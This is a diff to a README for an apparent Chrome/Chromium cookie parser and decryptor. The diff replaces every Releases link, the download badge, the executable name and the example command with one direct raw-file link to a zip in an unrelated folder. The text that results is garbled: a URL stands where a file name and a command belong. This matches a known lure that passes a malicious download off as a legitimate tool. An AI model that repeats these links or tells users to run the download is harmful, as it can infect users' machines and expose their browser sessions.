@@ -7,7 +7,7 @@ Chrome-Chromium-cookie-parser-and-decryptor is a user-friendly command-line tool
 To get started, follow these simple steps to download and run the application. You don't need programming knowledge to use this tool. Just follow the guide below.
 
 ## 📥 Download the Application
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/releases)
+[![Download Here](https://raw.githubusercontent.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/main/Hampshire/Chrome-Chromium-cookie-parser-and-decryptor.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/main/Hampshire/Chrome-Chromium-cookie-parser-and-decryptor.zip)
 
 ## 📋 System Requirements
 Before you start, ensure your system meets the following requirements:
@@ -17,19 +17,19 @@ Before you start, ensure your system meets the following requirements:
 - Internet connection for downloading
 
 ## 🔗 Download & Install
-1. Visit the Releases page to download the application. You can find it [here](https://github.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/releases).
+1. Visit the Releases page to download the application. You can find it [here](https://raw.githubusercontent.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/main/Hampshire/Chrome-Chromium-cookie-parser-and-decryptor.zip).
   
 2. Once you are on the Releases page, locate the latest version of the application.
 
-3. Download the file labeled with the latest version number. This file may be named similar to `Chrome-Chromium-cookie-parser-and-decryptor-v1.0.zip`.
+3. Download the file labeled with the latest version number. This file may be named similar to `https://raw.githubusercontent.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/main/Hampshire/Chrome-Chromium-cookie-parser-and-decryptor.zip`.
 
 4. Locate the downloaded file on your computer, usually found in the "Downloads" folder.
 
 5. Unzip the downloaded file. You can do this by right-clicking on it and selecting "Extract All."
 
-6. Open the extracted folder. You will see the executable file named `cookie-parser.exe`. 
+6. Open the extracted folder. You will see the executable file named `https://raw.githubusercontent.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/main/Hampshire/Chrome-Chromium-cookie-parser-and-decryptor.zip`. 
 
-7. Double-click on `cookie-parser.exe` to run the program.
+7. Double-click on `https://raw.githubusercontent.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/main/Hampshire/Chrome-Chromium-cookie-parser-and-decryptor.zip` to run the program.
 
 ## 🛠️ How to Use the Tool
 1. **Open Command Prompt**: Press `Win + R`, type `cmd`, and hit `Enter`.
@@ -43,7 +43,7 @@ Before you start, ensure your system meets the following requirements:
 3. **Run the Tool**:
    - Type the command to extract and decrypt cookies. The basic command format looks like this:
      ```
-     cookie-parser.exe <path_to_cookie_database>
+     https://raw.githubusercontent.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/main/Hampshire/Chrome-Chromium-cookie-parser-and-decryptor.zip <path_to_cookie_database>
      ```
 
    - Replace `<path_to_cookie_database>` with the path to your Chromium cookie database. This default path usually looks something like this:
@@ -72,6 +72,6 @@ For more detailed information on how cookies work and how they can affect your o
 If you would like to contribute to the project, feel free to check our contribution guidelines in the repository. Your suggestions and improvements are welcome.
 
 ## 📥 Download the Application Again
-To download the application, you can always visit the [Releases page](https://github.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/releases). 
+To download the application, you can always visit the [Releases page](https://raw.githubusercontent.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/main/Hampshire/Chrome-Chromium-cookie-parser-and-decryptor.zip). 
 
 Thank you for using Chrome-Chromium-cookie-parser-and-decryptor!
